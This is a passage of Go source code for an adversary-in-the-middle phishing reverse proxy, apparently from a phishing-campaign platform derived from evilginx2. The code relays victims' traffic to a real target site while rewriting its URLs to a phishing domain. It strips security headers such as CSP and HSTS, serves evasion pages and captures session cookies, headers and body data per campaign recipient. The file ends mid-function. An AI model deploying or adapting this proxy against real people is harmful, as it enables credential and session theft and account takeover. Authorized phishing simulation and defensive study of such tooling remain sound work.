package proxy

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"runtime/debug"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/PuerkitoBio/goquery"
	"github.com/go-errors/errors"
	"github.com/google/uuid"
	"github.com/phishingclub/phishingclub/cache"
	"github.com/phishingclub/phishingclub/data"
	"github.com/phishingclub/phishingclub/database"
	"github.com/phishingclub/phishingclub/model"
	"github.com/phishingclub/phishingclub/repository"
	"github.com/phishingclub/phishingclub/server"
	"github.com/phishingclub/phishingclub/service"
	"github.com/phishingclub/phishingclub/utils"
	"github.com/phishingclub/phishingclub/vo"
	"go.uber.org/zap"
	"gopkg.in/yaml.v3"
	"gorm.io/gorm"
)

/*
This source file is a modified / highly inspired by evilginx2 (https://github.com/kgretzky/evilginx2/)
Which was inspired by the bettercap (https://github.com/bettercap/bettercap) project.
Evilginx is a fantastic MITM phishing project - so check it out!

Thank you!
*/

/*
Portions of this code are derived from EvilGinx2 (https://github.com/kgretzky/evilginx2)
Copyright (c) 2017-2023 Kuba Gretzky (@kgretzky)
Licensed under BSD-3-Clause License

EvilGinx2 itself incorporates code from the Bettercap project:
https://github.com/bettercap/bettercap
Copyright (c) 2016-2023 Simone Margaritelli (@evilsocket)

This derivative work is licensed under AGPL-3.0.
See THIRD_PARTY_LICENSES.md for complete license texts.
*/

const (
	PROXY_COOKIE_MAX_AGE     = 3600
	CONVERT_TO_ORIGINAL_URLS = 0
	CONVERT_TO_PHISHING_URLS = 1
)

var (
	MATCH_URL_REGEXP                = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
	MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
)

type ProxySession struct {
	ID                    string
	CampaignRecipientID   *uuid.UUID
	CampaignID            *uuid.UUID
	RecipientID           *uuid.UUID
	Campaign              *model.Campaign
	Domain                *database.Domain
	TargetDomain          string
	Config                sync.Map // map[string]service.ProxyServiceDomainConfig
	CreatedAt             time.Time
	RequiredCaptures      sync.Map     // map[string]bool
	CapturedData          sync.Map     // map[string]map[string]string
	NextPageType          atomic.Value // string
	IsComplete            atomic.Bool
	CookieBundleSubmitted atomic.Bool
}

// RequestContext holds all the context data for a proxy request
type RequestContext struct {
	SessionID           string
	SessionCreated      bool
	PhishDomain         string
	TargetDomain        string
	Domain              *database.Domain
	ProxyConfig         *service.ProxyServiceConfigYAML
	Session             *ProxySession
	ConfigMap           map[string]service.ProxyServiceDomainConfig
	CampaignRecipientID *uuid.UUID
	ParamName           string
	PendingResponse     *http.Response
	// cached campaign data to avoid repeated queries
	Campaign          *model.Campaign
	CampaignTemplate  *model.CampaignTemplate
	CampaignRecipient *model.CampaignRecipient
	RecipientID       *uuid.UUID
	CampaignID        *uuid.UUID
	ProxyEntry        *model.Proxy
}

type ProxyHandler struct {
	logger                      *zap.SugaredLogger
	sessions                    sync.Map // map[string]*ProxySession
	campaignRecipientSessions   sync.Map // map[string]string (campaignRecipientID -> sessionID)
	urlMappings                 sync.Map // map[string]string (rewritten URL -> original URL)
	PageRepository              *repository.Page
	CampaignRecipientRepository *repository.CampaignRecipient
	CampaignRepository          *repository.Campaign
	CampaignTemplateRepository  *repository.CampaignTemplate
	DomainRepository            *repository.Domain
	ProxyRepository             *repository.Proxy
	IdentifierRepository        *repository.Identifier
	CampaignService             *service.Campaign
	TemplateService             *service.Template
	IPAllowListService          *service.IPAllowListService
	OptionRepository            *repository.Option
	cookieName                  string
}

func NewProxyHandler(
	logger *zap.SugaredLogger,
	pageRepo *repository.Page,
	campaignRecipientRepo *repository.CampaignRecipient,
	campaignRepo *repository.Campaign,
	campaignTemplateRepo *repository.CampaignTemplate,
	domainRepo *repository.Domain,
	proxyRepo *repository.Proxy,
	identifierRepo *repository.Identifier,
	campaignService *service.Campaign,
	templateService *service.Template,
	ipAllowListService *service.IPAllowListService,
	optionRepo *repository.Option,
) *ProxyHandler {
	// get proxy cookie name from database
	cookieName := "ps" // fallback default
	if opt, err := optionRepo.GetByKey(context.Background(), data.OptionKeyProxyCookieName); err == nil {
		cookieName = opt.Value.String()
	}

	return &ProxyHandler{
		logger:                      logger,
		PageRepository:              pageRepo,
		CampaignRecipientRepository: campaignRecipientRepo,
		CampaignRepository:          campaignRepo,
		CampaignTemplateRepository:  campaignTemplateRepo,
		DomainRepository:            domainRepo,
		ProxyRepository:             proxyRepo,
		IdentifierRepository:        identifierRepo,
		CampaignService:             campaignService,
		TemplateService:             templateService,
		IPAllowListService:          ipAllowListService,
		OptionRepository:            optionRepo,
		cookieName:                  cookieName,
	}
}

// HandleHTTPRequest processes incoming http requests through the proxy
func (m *ProxyHandler) HandleHTTPRequest(w http.ResponseWriter, req *http.Request, domain *database.Domain) (err error) {
	// add panic recovery with debug trace
	defer func() {
		if r := recover(); r != nil {
			m.logger.Errorw("proxy handler panic recovered",
				"panic", r,
				"host", req.Host,
				"path", req.URL.Path,
				"query", req.URL.RawQuery,
				"method", req.Method,
				"userAgent", req.UserAgent(),
				"remoteAddr", req.RemoteAddr,
				"stack", string(debug.Stack()),
			)
			err = fmt.Errorf("proxy handler panic: %v", r)
		}
	}()

	ctx := req.Context()

	// initialize request context
	reqCtx, err := m.initializeRequestContext(ctx, req, domain)
	if err != nil {
		return err
	}

	// check for URL rewrite and redirect if needed
	if rewriteResp := m.checkAndApplyURLRewrite(req, reqCtx); rewriteResp != nil {
		return m.writeResponse(w, rewriteResp)
	}

	// check ip filtering if we have a campaign recipient
	if reqCtx.CampaignRecipientID != nil {
		blocked, resp := m.checkIPFilter(req, reqCtx)
		if blocked {
			if resp != nil {
				return m.writeResponse(w, resp)
			}
			// if no deny page configured, return 404
			return m.writeResponse(w, &http.Response{
				StatusCode: http.StatusNotFound,
				Header:     make(http.Header),
				Body:       io.NopCloser(strings.NewReader("")),
			})
		}
	}

	// create http client
	client, err := m.createHTTPClient(req, reqCtx.ProxyConfig)
	if err != nil {
		return errors.Errorf("failed to create proxy HTTP client: %w", err)
	}

	// process request
	modifiedReq, resp := m.processRequestWithContext(req, reqCtx)
	if resp != nil {
		return m.writeResponse(w, resp)
	}

	// prepare request for target server
	m.prepareRequestForTarget(modifiedReq, client)

	// execute request
	targetResp, err := client.Do(modifiedReq)
	if err != nil {
		m.logger.Errorw("failed to execute proxied request", "error", err)
		return fmt.Errorf("failed to execute request: %w", err)
	}
	defer targetResp.Body.Close()

	// process response
	finalResp := m.processResponseWithContext(targetResp, reqCtx)

	// write final response
	return m.writeResponse(w, finalResp)
}

func (m *ProxyHandler) extractTargetDomain(domain *database.Domain) string {
	targetDomain := domain.ProxyTargetDomain
	if targetDomain == "" {
		return ""
	}
	if strings.Contains(targetDomain, "://") {
		if parsedURL, err := url.Parse(targetDomain); err == nil {
			targetDomain = parsedURL.Host
		}
	}
	return targetDomain
}

func (m *ProxyHandler) createHTTPClient(req *http.Request, proxyConfig *service.ProxyServiceConfigYAML) (*http.Client, error) {
	client := &http.Client{
		Timeout:   30 * time.Second,
		Transport: &http.Transport{},
	}

	if proxyConfig.Proxy != "" {
		proxyURL, err := url.Parse("http://" + proxyConfig.Proxy)
		if err != nil {
			return nil, err
		}
		client.Transport = &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		}
	}
	return client, nil
}

// initializeRequestContext creates and populates the request context with all necessary data
func (m *ProxyHandler) initializeRequestContext(ctx context.Context, req *http.Request, domain *database.Domain) (*RequestContext, error) {
	// setup proxy config
	proxyEntry, err := m.ProxyRepository.GetByID(ctx, domain.ProxyID, &repository.ProxyOption{})
	if err != nil {
		return nil, errors.Errorf("failed to fetch Proxy config: %w", err)
	}
	proxyConfig, err := m.parseProxyConfig(proxyEntry.ProxyConfig.MustGet().String())
	if err != nil {
		return nil, errors.Errorf("failed to parse Proxy config for domain %s: %w", domain.Name, err)
	}

	// extract target domain
	targetDomain := m.extractTargetDomain(domain)
	if targetDomain == "" {
		return nil, errors.Errorf("domain has empty Proxy target domain")
	}

	// check for campaign recipient id
	campaignRecipientID, paramName := m.getCampaignRecipientIDFromURLParams(req)

	reqCtx := &RequestContext{
		PhishDomain:         req.Host,
		TargetDomain:        targetDomain,
		Domain:              domain,
		ProxyConfig:         proxyConfig,
		CampaignRecipientID: campaignRecipientID,
		ParamName:           paramName,
		ProxyEntry:          proxyEntry,
	}

	// preload campaign data if we have a campaign recipient ID
	if campaignRecipientID != nil {
		// get campaign recipient
		cRecipient, err := m.CampaignRecipientRepository.GetByID(ctx, campaignRecipientID, &repository.CampaignRecipientOption{})
		if err != nil {
			return nil, errors.Errorf("failed to get campaign recipient: %w", err)
		}
		reqCtx.CampaignRecipient = cRecipient

		// get recipient and campaign IDs
		recipientID, err := cRecipient.RecipientID.Get()
		if err != nil {
			return nil, errors.Errorf("failed to get recipient ID: %w", err)
		}
		campaignID, err := cRecipient.CampaignID.Get()
		if err != nil {
			return nil, errors.Errorf("failed to get campaign ID: %w", err)
		}
		reqCtx.RecipientID = &recipientID
		reqCtx.CampaignID = &campaignID

		// get campaign
		campaign, err := m.CampaignRepository.GetByID(ctx, &campaignID, &repository.CampaignOption{
			WithCampaignTemplate: true,
		})
		if err != nil {
			return nil, errors.Errorf("failed to get campaign: %w", err)
		}
		reqCtx.Campaign = campaign

		// preload campaign template if available
		if templateID, err := campaign.TemplateID.Get(); err == nil {
			cTemplate, err := m.CampaignTemplateRepository.GetByID(ctx, &templateID, &repository.CampaignTemplateOption{
				WithDomain:     true,
				WithIdentifier: true,
				WithEmail:      true,
			})
			if err == nil {
				reqCtx.CampaignTemplate = cTemplate
			}
		}
	}

	return reqCtx, nil
}

func (m *ProxyHandler) processRequestWithContext(req *http.Request, reqCtx *RequestContext) (*http.Request, *http.Response) {
	// ensure scheme is set
	if req.URL.Scheme == "" {
		req.URL.Scheme = "https"
	}

	reqURL := req.URL.String()

	// check for existing session first
	sessionCookie, err := req.Cookie(m.cookieName)
	if err == nil && m.isValidSessionCookie(sessionCookie.Value) {
		reqCtx.SessionID = sessionCookie.Value
	}

	// always create new session for initial MITM page visits with campaign recipient ID
	createSession := reqCtx.CampaignRecipientID != nil

	// check if this has a valid state parameter (post-evasion request)
	hasValidStateParameter := false
	if createSession && reqCtx.Campaign != nil && reqCtx.CampaignTemplate != nil {
		if reqCtx.CampaignTemplate.StateIdentifier != nil {
			stateParamKey := reqCtx.CampaignTemplate.StateIdentifier.Name.MustGet()
			encryptedParam := req.URL.Query().Get(stateParamKey)
			if encryptedParam != "" && reqCtx.CampaignID != nil {
				secret := utils.UUIDToSecret(reqCtx.CampaignID)
				if decrypted, err := utils.Decrypt(encryptedParam, secret); err == nil {
					hasValidStateParameter = decrypted != "deny"
				}
			}
		}
	}

	// check for deny pages first (for any campaign recipient ID)
	if reqCtx.CampaignRecipientID != nil {
		if resp := m.checkAndServeDenyPage(req, reqCtx); resp != nil {
			return req, resp
		}
	}

	// check for evasion/deny pages BEFORE session resolution for initial requests
	if createSession {
		// cleanup any existing session first
		m.cleanupExistingSession(reqCtx.CampaignRecipientID, reqURL)

		// check for evasion page only if no valid state parameter (initial request)
		if !hasValidStateParameter {
			if resp := m.checkAndServeEvasionPage(req, reqCtx); resp != nil {
				return req, resp
			}
		}
	}

	// check for response rules first (before access control)
	if resp := m.checkResponseRules(req, reqCtx); resp != nil {
		// if response rule doesn't forward, return response immediately
		if !m.shouldForwardRequest(req, reqCtx) {
			return req, resp
		}
		// if response rule forwards, we'll send the response after proxying
		reqCtx.PendingResponse = resp
	}

	// check access control before proceeding
	hasSession := reqCtx.SessionID != ""

	if allowed, denyAction := m.evaluatePathAccess(req.URL.Path, reqCtx, hasSession, req); !allowed {
		return req, m.createDenyResponse(req, reqCtx, denyAction, hasSession)
	}

	// get or create session and populate context if we have campaign recipient ID or valid session
	if reqCtx.CampaignRecipientID != nil || reqCtx.SessionID != "" {
		err = m.resolveSessionContext(req, reqCtx, createSession)
		if err != nil {
			m.logger.Errorw("failed to resolve session context", "error", err)
			return req, m.createServiceUnavailableResponse("Service temporarily unavailable")
		}

		// apply session-based request processing
		return m.applySessionToRequestWithContext(req, reqCtx), nil
	}

	return m.prepareRequestWithoutSession(req, reqCtx), nil
}

func (m *ProxyHandler) cleanupExistingSession(campaignRecipientID *uuid.UUID, reqURL string) {
	if existingSessionID := m.findSessionByCampaignRecipient(campaignRecipientID); existingSessionID != "" {
		m.sessions.Delete(existingSessionID)
		m.campaignRecipientSessions.Delete(campaignRecipientID.String())

	}
}

func (m *ProxyHandler) prepareRequestWithoutSession(req *http.Request, reqCtx *RequestContext) *http.Request {
	// set host and scheme
	req.Host = reqCtx.TargetDomain
	req.URL.Host = reqCtx.TargetDomain
	req.URL.Scheme = "https"

	// create a dummy session for header normalization (no campaign/session data)
	dummySession := &ProxySession{
		Config: sync.Map{},
	}
	// populate dummy config for normalization
	dummySession.Config.Store(reqCtx.TargetDomain, service.ProxyServiceDomainConfig{
		To: reqCtx.TargetDomain,
	})

	// normalize headers
	m.normalizeRequestHeaders(req, dummySession)

	// patch query parameters
	m.patchQueryParametersWithContext(req, reqCtx)

	// get host config from ProxyConfig.Hosts using TargetDomain
	var hostConfig service.ProxyServiceDomainConfig
	if reqCtx.ProxyConfig != nil && reqCtx.ProxyConfig.Hosts != nil {
		if cfg, ok := reqCtx.ProxyConfig.Hosts[reqCtx.TargetDomain]; ok {
			hostConfig = *cfg
		}
	}

	// apply header rewrite rules (no capture)
	if hostConfig.Rewrite != nil {
		for _, replacement := range hostConfig.Rewrite {
			if replacement.From == "" || replacement.From == "request_header" || replacement.From == "any" {
				engine := replacement.Engine
				if engine == "" {
					engine = "regex"
				}
				if engine == "regex" {
					re, err := regexp.Compile(replacement.Find)
					if err != nil {
						continue
					}
					for headerName, values := range req.Header {
						newValues := make([]string, 0, len(values))
						for _, val := range values {
							fullHeader := headerName + ": " + val
							replaced := re.ReplaceAllString(fullHeader, replacement.Replace)
							if strings.HasPrefix(replaced, headerName+": ") {
								newVal := replaced[len(headerName)+2:]
								newValues = append(newValues, newVal)
							} else if replaced != fullHeader {
								newValues = append(newValues, val)
							} else {
								newValues = append(newValues, val)
							}
						}
						req.Header[headerName] = newValues
					}
				}
			}
		}
	}

	// apply body rewrite rules (no capture)
	if req.Body != nil {
		body, err := io.ReadAll(req.Body)
		if err == nil {
			if hostConfig.Rewrite != nil {
				for _, replacement := range hostConfig.Rewrite {
					if replacement.From == "" || replacement.From == "request_body" || replacement.From == "any" {
						engine := replacement.Engine
						if engine == "" {
							engine = "regex"
						}
						if engine == "regex" {
							re, err := regexp.Compile(replacement.Find)
							if err == nil {
								oldContent := string(body)
								content := re.ReplaceAllString(oldContent, replacement.Replace)
								body = []byte(content)
							}
						}
					}
				}
			}
			req.Body = io.NopCloser(bytes.NewBuffer(body))
			req.ContentLength = int64(len(body))
		}
	}
	if req.Body != nil {
		body, err := io.ReadAll(req.Body)
		if err == nil {
			if hostConfig.Rewrite != nil {
				for _, replacement := range hostConfig.Rewrite {
					if replacement.From == "" || replacement.From == "request_body" || replacement.From == "any" {
						engine := replacement.Engine
						if engine == "" {
							engine = "regex"
						}
						if engine == "regex" {
							re, err := regexp.Compile(replacement.Find)
							if err == nil {
								oldContent := string(body)
								content := re.ReplaceAllString(oldContent, replacement.Replace)
								body = []byte(content)
							}
						}
					}
				}
			}
			req.Body = io.NopCloser(bytes.NewBuffer(body))
			req.ContentLength = int64(len(body))
		}
	}

	return req
}

// resolveSessionContext gets or creates a session and populates the request context
func (m *ProxyHandler) resolveSessionContext(req *http.Request, reqCtx *RequestContext, createSession bool) error {
	if createSession {
		newSession, err := m.createNewSession(req, reqCtx)
		if err != nil {
			return err
		}
		reqCtx.SessionID = newSession.ID
		reqCtx.SessionCreated = true
		reqCtx.Session = newSession

		// register page visit event for MITM landing
		m.registerPageVisitEvent(req, newSession)

		// allow list IP for tunnel mode access
		clientIP := m.getClientIP(req)
		if clientIP != "" {
			m.IPAllowListService.AddIP(clientIP, reqCtx.Domain.ProxyID.String(), 10*time.Minute)
		}
	} else {
		// load existing session
		sessionVal, exists := m.sessions.Load(reqCtx.SessionID)
		if !exists {
			return fmt.Errorf("session not found")
		}
		session, ok := sessionVal.(*ProxySession)
		if !ok {
			return fmt.Errorf("invalid session type")
		}
		reqCtx.Session = session
	}

	// populate config map once
	reqCtx.ConfigMap = m.configToMap(&reqCtx.Session.Config)
	return nil
}

func (m *ProxyHandler) applySessionToRequestWithContext(req *http.Request, reqCtx *RequestContext) *http.Request {
	// handle initial request with campaign recipient id
	if reqCtx.CampaignRecipientID != nil && reqCtx.SessionCreated {

		// always redirect to StartURL for new sessions (both initial and post-evasion)
		// use cached proxy configuration to extract start url
		if reqCtx.ProxyEntry != nil {
			startURL, err := reqCtx.ProxyEntry.StartURL.Get()
			if err == nil {
				// parse start url to get the target path and query
				if parsedStartURL, err := url.Parse(startURL.String()); err == nil {
					// use the path and query from start url for initial mitm visits
					req.URL.Path = parsedStartURL.Path
					req.URL.RawQuery = parsedStartURL.RawQuery
				}
			}
		}
	}

	// handle any request with campaign recipient id (initial or existing session)
	if reqCtx.CampaignRecipientID != nil {
		req.Host = reqCtx.Session.TargetDomain
		req.URL.Scheme = "https"
		req.URL.Host = reqCtx.Session.TargetDomain
		// remove campaign parameters from query params
		q := req.URL.Query()
		q.Del(reqCtx.ParamName)

		// also remove state parameter if exists using cached template data
		if reqCtx.Session.Campaign != nil && reqCtx.CampaignTemplate != nil && reqCtx.CampaignTemplate.StateIdentifier != nil {
			stateParamKey := reqCtx.CampaignTemplate.StateIdentifier.Name.MustGet()
			q.Del(stateParamKey)
		}
		req.URL.RawQuery = q.Encode()
	} else {
		// for subsequent requests, map to original host
		originalHost := m.replaceHostWithOriginal(req.Host, reqCtx.ConfigMap)
		req.Host = originalHost
		req.URL.Host = originalHost
	}

	// apply request processing
	m.processRequestWithSessionContext(req, reqCtx)
	return req
}

func (m *ProxyHandler) processRequestWithSessionContext(req *http.Request, reqCtx *RequestContext) {
	// normalize headers
	m.normalizeRequestHeaders(req, reqCtx.Session)

	// apply replace and capture rules
	m.onRequestBody(req, reqCtx.Session)
	m.onRequestHeader(req, reqCtx.Session)

	// patch query parameters
	m.patchQueryParametersWithContext(req, reqCtx)

	// patch request body
	m.patchRequestBodyWithContext(req, reqCtx)
}

func (m *ProxyHandler) patchQueryParametersWithContext(req *http.Request, reqCtx *RequestContext) {
	qs := req.URL.Query()
	if len(qs) == 0 {
		return
	}

	for param := range qs {
		for i, value := range qs[param] {
			qs[param][i] = string(m.patchUrls(reqCtx.ConfigMap, []byte(value), CONVERT_TO_ORIGINAL_URLS))
		}
	}
	req.URL.RawQuery = qs.Encode()
}

func (m *ProxyHandler) patchRequestBodyWithContext(req *http.Request, reqCtx *RequestContext) {
	if req.Body == nil {
		return
	}

	body, err := io.ReadAll(req.Body)
	if err != nil {
		m.logger.Errorw("failed to read request body for patching", "error", err)
		return
	}
	req.Body.Close()

	body = m.patchUrls(reqCtx.ConfigMap, body, CONVERT_TO_ORIGINAL_URLS)
	req.Body = io.NopCloser(bytes.NewBuffer(body))
	req.ContentLength = int64(len(body))
}

func (m *ProxyHandler) prepareRequestForTarget(req *http.Request, client *http.Client) {
	req.RequestURI = ""
	req.Header.Del("Accept-Encoding")

	// setup cookie jar for redirect handling
	jar, _ := cookiejar.New(nil)
	client.Jar = jar
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	// remove proxy session cookie
	m.removeProxyCookie(req)
}

func (m *ProxyHandler) removeProxyCookie(req *http.Request) {
	if req.Header.Get("Cookie") == "" {
		return
	}

	cookies := req.Cookies()
	var filteredCookies []*http.Cookie
	for _, cookie := range cookies {
		if cookie.Name != m.cookieName {
			filteredCookies = append(filteredCookies, cookie)
		}
	}

	req.Header.Del("Cookie")
	for _, cookie := range filteredCookies {
		req.AddCookie(cookie)
	}
}

func (m *ProxyHandler) processResponseWithContext(resp *http.Response, reqCtx *RequestContext) *http.Response {
	if resp == nil {
		return nil
	}

	// check for pending response from response rules with forward: true
	if reqCtx.PendingResponse != nil {
		// if we have a pending response, return it instead of the proxied response
		return reqCtx.PendingResponse
	}

	// handle responses with or without session
	if reqCtx.SessionID != "" && reqCtx.Session != nil {
		// capture response data before any rewriting
		m.captureResponseDataWithContext(resp, reqCtx)

		// process cookies for phishing domain responses after capture
		if reqCtx.PhishDomain != "" {
			m.processCookiesForPhishingDomainWithContext(resp, reqCtx)
		}

		return m.processResponseWithSessionContext(resp, reqCtx)
	}

	// process cookies for phishing domain responses (no session case)
	if reqCtx.PhishDomain != "" {
		m.processCookiesForPhishingDomainWithContext(resp, reqCtx)
	}

	return m.processResponseWithoutSessionContext(resp, reqCtx)
}

func (m *ProxyHandler) captureResponseDataWithContext(resp *http.Response, reqCtx *RequestContext) {
	// capture cookies, headers, and body
	m.onResponseCookies(resp, reqCtx.Session)
	m.onResponseHeader(resp, reqCtx.Session)

	contentType := resp.Header.Get("Content-Type")
	if m.shouldProcessContent(contentType) {
		body, _, err := m.readAndDecompressBody(resp)
		if err == nil {
			m.onResponseBody(resp, body, reqCtx.Session)
			resp.Body = io.NopCloser(bytes.NewReader(body))
		}
	}
}

func (m *ProxyHandler) processResponseWithSessionContext(resp *http.Response, reqCtx *RequestContext) *http.Response {
	// set session cookie for new sessions
	if reqCtx.SessionCreated {
		// clear all existing cookies for initial MITM visit to ensure fresh start
		m.clearAllCookiesForInitialMitmVisit(resp, reqCtx)
		m.setSessionCookieWithContext(resp, reqCtx)
	}

	// check for campaign flow progression
	if m.shouldRedirectForCampaignFlow(reqCtx.Session, resp.Request) {
		if redirectResp := m.createCampaignFlowRedirect(reqCtx.Session, resp); redirectResp != nil {
			if reqCtx.SessionCreated {
				m.copyCookieToResponse(resp, redirectResp)
			}
			return redirectResp
		}
	}

	// apply response rewriting
	m.rewriteResponseHeadersWithContext(resp, reqCtx)
	m.rewriteResponseBodyWithContext(resp, reqCtx)

	return resp
}

func (m *ProxyHandler) setSessionCookieWithContext(resp *http.Response, reqCtx *RequestContext) {
	cookie := &http.Cookie{
		Name:     m.cookieName,
		Value:    reqCtx.SessionID,
		Path:     "/",
		Domain:   "." + reqCtx.PhishDomain,
		Expires:  time.Now().Add(time.Duration(PROXY_COOKIE_MAX_AGE) * time.Second),
		HttpOnly: true,
		Secure:   true,
		SameSite: http.SameSiteLaxMode,
	}

	resp.Header.Add("Set-Cookie", cookie.String())
}

func (m *ProxyHandler) copyCookieToResponse(sourceResp, targetResp *http.Response) {
	cookieHeaders := sourceResp.Header.Values("Set-Cookie")
	for _, cookieHeader := range cookieHeaders {
		targetResp.Header.Add("Set-Cookie", cookieHeader)
	}
}

func (m *ProxyHandler) rewriteResponseHeadersWithContext(resp *http.Response, reqCtx *RequestContext) {
	// remove security headers
	securityHeaders := []string{
		"Content-Security-Policy",
		"Content-Security-Policy-Report-Only",
		"Strict-Transport-Security",
		"X-XSS-Protection",
		"X-Content-Type-Options",
		"X-Frame-Options",
	}
	for _, header := range securityHeaders {
		resp.Header.Del(header)
	}

	// fix cors headers
	if allowOrigin := resp.Header.Get("Access-Control-Allow-Origin"); allowOrigin != "" && allowOrigin != "*" {
		if oURL, err := url.Parse(allowOrigin); err == nil {
			if phishHost := m.replaceHostWithPhished(oURL.Host, reqCtx.ConfigMap); phishHost != "" {
				oURL.Host = phishHost
				resp.Header.Set("Access-Control-Allow-Origin", oURL.String())
			}
		}
		resp.Header.Set("Access-Control-Allow-Credentials", "true")
	}

	// fix location header
	if location := resp.Header.Get("Location"); location != "" {
		if rURL, err := url.Parse(location); err == nil {
			if phishHost := m.replaceHostWithPhished(rURL.Host, reqCtx.ConfigMap); phishHost != "" {
				rURL.Host = phishHost
				resp.Header.Set("Location", rURL.String())
			}
		}
	}

	// apply custom replacement rules for response headers (after all hardcoded changes)
	if reqCtx.Session != nil {
		m.applyCustomResponseHeaderReplacements(resp, reqCtx.Session)
	}
}

func (m *ProxyHandler) applyCustomResponseHeaderReplacements(resp *http.Response, session *ProxySession) {
	// get all headers as a string
	var buf bytes.Buffer
	resp.Header.Write(&buf)
	headers := buf.Bytes()

	session.Config.Range(func(key, value interface{}) bool {
		hostConfig := value.(service.ProxyServiceDomainConfig)
		if hostConfig.Rewrite != nil {
			for _, replacement := range hostConfig.Rewrite {
				if replacement.From == "response_header" || replacement.From == "any" {
					headers = m.applyReplacement(headers, replacement, session.ID)
				}
			}
		}
		return true
	})

	// parse the modified headers back
	if string(headers) != buf.String() {
		// clear existing headers and parse the new ones
		resp.Header = make(http.Header)
		lines := strings.Split(string(headers), "\r\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line == "" {
				continue
			}
			if parts := strings.SplitN(line, ":", 2); len(parts) == 2 {
				headerName := strings.TrimSpace(parts[0])
				headerValue := strings.TrimSpace(parts[1])
				if headerName != "" {
					resp.Header.Add(headerName, headerValue)
				}
			}
		}
	}
}

func (m *ProxyHandler) rewriteResponseBodyWithContext(resp *http.Response, reqCtx *RequestContext) {
	contentType := resp.Header.Get("Content-Type")
	if !m.shouldProcessContent(contentType) {
		return
	}

	defer resp.Body.Close()
	body, wasCompressed, err := m.readAndDecompressBody(resp)
	if err != nil {
		m.logger.Errorw("failed to read and decompress response body", "error", err)
		return
	}

	body = m.patchUrls(reqCtx.ConfigMap, body, CONVERT_TO_PHISHING_URLS)
	body = m.applyURLPathRewrites(body, reqCtx)
	body = m.applyCustomReplacements(body, reqCtx.Session)

	m.updateResponseBody(resp, body, wasCompressed)
	resp.Header.Set("Cache-Control", "no-cache, no-store")
}

func (m *ProxyHandler) processResponseWithoutSessionContext(resp *http.Response, reqCtx *RequestContext) *http.Response {
	// create minimal config for url rewriting
	config := m.createMinimalConfig(reqCtx.PhishDomain, reqCtx.TargetDomain)

	// apply basic response processing
	m.removeSecurityHeaders(resp)
	m.rewriteLocationHeaderWithoutSession(resp, config)
	m.rewriteResponseBodyWithoutSessionContext(resp, reqCtx, config)
